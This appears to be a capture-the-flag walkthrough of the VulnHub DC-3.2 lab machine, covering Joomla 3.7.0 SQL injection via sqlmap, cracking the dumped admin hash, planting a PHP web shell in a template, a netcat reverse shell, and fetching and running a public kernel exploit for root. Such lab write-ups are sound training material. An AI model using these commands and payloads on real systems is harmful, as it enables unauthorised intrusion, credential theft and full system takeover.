# DC-3.2 VulnHub Walkthrough

This walkthrough documents my approach to solving the DC-3.2 machine from VulnHub.  
The lab focused on Joomla enumeration, SQL injection exploitation, credential recovery, remote code execution, reverse shell access, and Linux privilege escalation.

---

# Target Information

| Field | Value |
|-------|-------|
| Target | DC-3.2 |
| Platform | VulnHub |
| Operating System | Ubuntu 16.04 |
| Objective | Gain root access and capture the flag |

<img width="1919" height="1003" alt="image" src="https://github.com/user-attachments/assets/38a44c7b-8b38-4f7b-89b9-1a187def4d8a" />

---

# Reconnaissance

An initial Nmap scan was performed to identify open ports and running services.

```bash
nmap -sS -sC -sV -p- 192.168.1.5
```

## Findings

- Port 80/tcp open
- Apache 2.4.18
- Joomla CMS detected

<img width="1862" height="259" alt="image" src="https://github.com/user-attachments/assets/4b956587-4cb1-4112-a2ea-bdd7cba4675b" />


---

# Web Enumeration

Directory enumeration was performed against the web application.

```bash
dirsearch -u http://192.168.1.5
```

## Interesting Directories

- `/administrator`
- `/configuration.php`
- `/README.txt`

The presence of Joomla administrator directories suggested the target was running Joomla CMS.

<img width="1841" height="776" alt="image" src="https://github.com/user-attachments/assets/0454c52c-6528-469b-92f2-3be165326140" />
<img width="1847" height="703" alt="image" src="https://github.com/user-attachments/assets/9532e5fa-9cf6-4e3f-a88d-990cf31dba5e" />



---

# Joomla Version Identification

The Joomla version was identified using the README file.

```bash
curl -s http://192.168.1.5/README.txt
```

The output revealed:

```text
Joomla 3.7.0
```

<img width="1852" height="671" alt="image" src="https://github.com/user-attachments/assets/a2820981-48e9-4eda-8bd5-d2ce1c9956b5" />
<img width="1755" height="95" alt="image" src="https://github.com/user-attachments/assets/a34fe62f-9abc-4456-9020-71b91bd33ac1" />


---

# Vulnerability Identification

Searchsploit was used to identify publicly known vulnerabilities affecting Joomla 3.7.0.

```bash
searchsploit Joomla 3.7.0
```

## Vulnerability Found

- CVE-2017-8917
- Joomla com_fields SQL Injection

The exploit was copied locally for reference.

```bash
searchsploit -m 42033.txt
```

<img width="1919" height="787" alt="image" src="https://github.com/user-attachments/assets/24d4ad1e-5d44-4a10-b84c-d25b2439dc5a" />


---

# SQL Injection Exploitation

The vulnerable `com_fields` parameter was exploited using sqlmap.

## Initial Exploitation

```bash
sqlmap -u "http://192.168.1.5/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --batch
```

After confirming SQL injection, the Joomla users table was dumped.

## Dump Joomla Users Table

```bash
sqlmap -u "http://192.168.1.5/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomladb -T "#__users" -C username,password,email --dump --batch
```

## Credentials Retrieved

| Username | Password Hash |
|----------|----------------|
| admin | \$2y\$10\$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |

## Screenshot

<img width="1920" height="948" alt="image" src="https://github.com/user-attachments/assets/b09c4d73-6884-4984-bac8-be3808b7ebcf" />
<img width="1920" height="953" alt="image" src="https://github.com/user-attachments/assets/73e45f6f-07ff-4f74-adff-31b7e2b8ced1" />
<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/9733b6b7-cdf5-4cf3-9d2b-3e55c09bee69" />
<img width="1920" height="951" alt="image" src="https://github.com/user-attachments/assets/f7c03d30-07ce-487a-83bb-7a64afa05485" />


---

# Password Cracking

The recovered Joomla password hash was cracked using John the Ripper.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Password Recovered

```text
snoopy
```

<img width="1920" height="261" alt="image" src="https://github.com/user-attachments/assets/77ade192-e2bd-404b-bcde-4eeb32a8396f" />


---

# Joomla Administrator Access

The Joomla administrator panel was accessed successfully.

```text
http://192.168.1.5/administrator
```

Credentials used:

| Username | Password |
|----------|-----------|
| admin | snoopy |

Administrative access to Joomla was obtained successfully.

<img width="1920" height="998" alt="image" src="https://github.com/user-attachments/assets/26e8a9cd-70c4-4534-8f71-7434c84b28ba" />


---

# Remote Code Execution

Template modification was used to achieve remote code execution.

## Template Modification

Navigated to:

```text
Extensions → Templates → Protostar → error.php
```

Inserted the following payload:

```php
<?php system($_GET['cmd']); ?>
```

## Command Execution Test

```text
http://192.168.1.5/templates/protostar/error.php?cmd=id
```

Successful command execution confirmed remote code execution.

<img width="1920" height="687" alt="image" src="https://github.com/user-attachments/assets/a103db61-a702-453c-8579-1271592ae599" />


---

# Reverse Shell Access

A Netcat listener was started locally.

## Listener

```bash
nc -lvnp 1234
```

A PHP reverse shell payload was triggered through the modified template.

Shell access was obtained as:

```text
www-data

---

# Shell Stabilization

The shell was upgraded to a more interactive TTY shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Terminal settings were improved using:

```bash
export TERM=xterm
```

<img width="1920" height="583" alt="image" src="https://github.com/user-attachments/assets/99236d6c-dc65-4238-b8f4-a1eaf5335fd0" />


---

# Local Enumeration

Privilege escalation enumeration was performed using common Linux enumeration tools.

Tools used:

- LinEnum
- Linux Exploit Suggester

## Important Findings

| Finding | Value |
|---------|-------|
| Kernel | 4.4.0-21-generic |
| Operating System | Ubuntu 16.04 |
| Vulnerable | Multiple kernel exploits |

Linux Exploit Suggester identified:

- Dirty COW
- double-fdput
- Chocobo Root

# Privilege Escalation

The privilege escalation path chosen was:

```text
CVE-2016-4557 — double-fdput
```

## Exploit Preparation

The exploit package was downloaded locally.

```bash
wget -4 https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
```

The archive was extracted.

```bash
unzip 39772.zip
cd 39772
tar -xf exploit.tar
```

The exploit was compiled.

```bash
cd ebpf_mapfd_doubleput_exploit
chmod +x compile.sh
./compile.sh
```

## Exploit Execution

```bash
./doubleput
```

## Successful Output

```text
we have root privs now...
```

<img width="1920" height="656" alt="image" src="https://github.com/user-attachments/assets/20980334-ff98-400e-8062-b04239950ea8" />
<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/29bd1f9b-b50a-437b-8015-7df6e6a2a818" />
<img width="1920" height="808" alt="image" src="https://github.com/user-attachments/assets/527c0547-45d2-4f24-bc3e-0aa44386a3a0" />
<img width="1920" height="518" alt="image" src="https://github.com/user-attachments/assets/56b2172b-2346-44c0-8669-5db581c4a4f9" />


---

# Root Access

Root access was verified successfully.

```bash
whoami
```

```bash
id
```

Output:

```text
root
```

---

# Flag Capture

The final flag was located inside the root directory.

```bash
cd /root
cat the-flag.txt
```

The flag was retrieved successfully.

<img width="1920" height="434" alt="image" src="https://github.com/user-attachments/assets/64112612-3564-4f7c-b155-a9997b5bda31" />


---

# Challenges Faced

Several issues were encountered during exploitation and privilege escalation:

- Joomla administrator access initially failed due to incorrect password formatting
- Shell stabilization required upgrading the basic reverse shell
- Compilation errors occurred initially while preparing the privilege escalation exploit
- Kernel exploit selection required manual verification before execution

Troubleshooting these issues improved understanding of Linux exploitation workflows and privilege escalation techniques.

---

# Tools Used

- Nmap
- Dirsearch
- Searchsploit
- sqlmap
- John the Ripper
- Netcat
- LinEnum
- Linux Exploit Suggester

---

# Conclusion

DC-3.2 was a practical beginner-to-intermediate level machine that combined web exploitation and Linux privilege escalation techniques.

The lab covered:

- Joomla CMS exploitation
- SQL injection attacks
- Password recovery
- Remote code execution
- Reverse shell access
- Linux kernel privilege escalation

The machine provided valuable hands-on experience with both web application exploitation and post-exploitation privilege escalation workflows.
